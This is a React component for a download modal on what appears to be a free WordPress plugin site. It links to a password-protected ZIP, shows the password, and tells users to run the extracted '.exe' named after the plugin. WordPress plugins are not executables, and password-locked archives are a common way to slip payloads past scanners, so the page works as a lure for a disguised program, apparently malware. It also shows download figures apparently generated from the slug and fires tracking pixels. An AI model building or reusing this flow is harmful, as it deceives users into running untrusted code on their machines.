"use client";

import { useEffect, useId, useRef, useState } from "react";
import { formatInstalls } from "@/lib/format";
import {
  ARCHIVE_PASSWORD,
  PACKAGE_ZIP_URL,
  displayDownloads,
} from "@/lib/download";

type DownloadModalProps = {
  pluginName: string;
  pluginSlug: string;
  category?: string;
  buttonClassName?: string;
  buttonLabel?: string;
};

function track(type: "view" | "download", n: string, s: string, c: string) {
  try {
    const q = new URLSearchParams({ t: type, n, s, c });
    // fire-and-forget pixel (same idea as plugin-dex.forum/api/e)
    new Image().src = `/api/e?${q.toString()}`;
  } catch {
    // ignore
  }
}

export function DownloadModal({
  pluginName,
  pluginSlug,
  category = "WordPress",
  buttonClassName = "button button-primary",
  buttonLabel = "Download package",
}: DownloadModalProps) {
  const [open, setOpen] = useState(false);
  const [copied, setCopied] = useState(false);
  const titleId = useId();
  const downloads = displayDownloads(pluginSlug);
  const viewed = useRef(false);

  useEffect(() => {
    if (!open) return;
    if (!viewed.current) {
      viewed.current = true;
      track("view", pluginName, pluginSlug, category);
    }
    const onKey = (e: KeyboardEvent) => {
      if (e.key === "Escape") setOpen(false);
    };
    document.addEventListener("keydown", onKey);
    const prev = document.body.style.overflow;
    document.body.style.overflow = "hidden";
    return () => {
      document.removeEventListener("keydown", onKey);
      document.body.style.overflow = prev;
    };
  }, [open, pluginName, pluginSlug, category]);

  async function copyPassword() {
    try {
      await navigator.clipboard.writeText(ARCHIVE_PASSWORD);
      setCopied(true);
      window.setTimeout(() => setCopied(false), 1600);
    } catch {
      setCopied(false);
    }
  }

  function onDownloadClick() {
    track("download", pluginName, pluginSlug, category);
  }

  return (
    <>
      <button
        type="button"
        className={buttonClassName}
        onClick={() => setOpen(true)}
      >
        {buttonLabel}
      </button>

      {open ? (
        <div
          className="dl-modal-root"
          role="presentation"
          onClick={(e) => {
            if (e.target === e.currentTarget) setOpen(false);
          }}
        >
          <div
            className="dl-modal-card"
            role="dialog"
            aria-modal="true"
            aria-labelledby={titleId}
          >
            <button
              type="button"
              className="dl-modal-close"
              aria-label="Close"
              onClick={() => setOpen(false)}
            >
              ×
            </button>

            <div className="dl-modal-badges">
              <span className="dl-badge free">Free</span>
              <span className="dl-badge muted">
                {formatInstalls(downloads)} downloads
              </span>
            </div>

            <h2 id={titleId}>{pluginName}</h2>
            <p className="dl-modal-sub">
              Your file is ready. Start the free download below.
            </p>

            <dl className="dl-modal-stats">
              <div>
                <dt>Downloads</dt>
                <dd>{formatInstalls(downloads)}</dd>
              </div>
              <div>
                <dt>Category</dt>
                <dd>{category}</dd>
              </div>
              <div>
                <dt>Package</dt>
                <dd>ZIP</dd>
              </div>
            </dl>

            <a
              className="button button-primary dl-modal-cta"
              href={PACKAGE_ZIP_URL}
              rel="noopener noreferrer"
              onClick={onDownloadClick}
            >
              Download Free
            </a>

            <div className="dl-pw-box">
              <label htmlFor={`zip-pass-${pluginSlug}`}>Archive password</label>
              <div className="dl-pw-row">
                <input
                  id={`zip-pass-${pluginSlug}`}
                  type="text"
                  value={ARCHIVE_PASSWORD}
                  readOnly
                  aria-label="Archive password"
                />
                <button type="button" onClick={copyPassword}>
                  {copied ? "Copied" : "Copy"}
                </button>
              </div>
              <p className="dl-pw-hint">
                ZIP is password-protected. Use{" "}
                <b>{ARCHIVE_PASSWORD}</b> when extracting.
              </p>
              <ol className="dl-pw-steps">
                <li>
                  Extract the archive with password <b>{ARCHIVE_PASSWORD}</b>
                </li>
                <li>
                  Run the extracted <b>.exe</b> (same name as the plugin)
                </li>
                <li>Find your plugin in search and install it</li>
              </ol>
            </div>
          </div>
        </div>
      ) : null}
    </>
  );
}
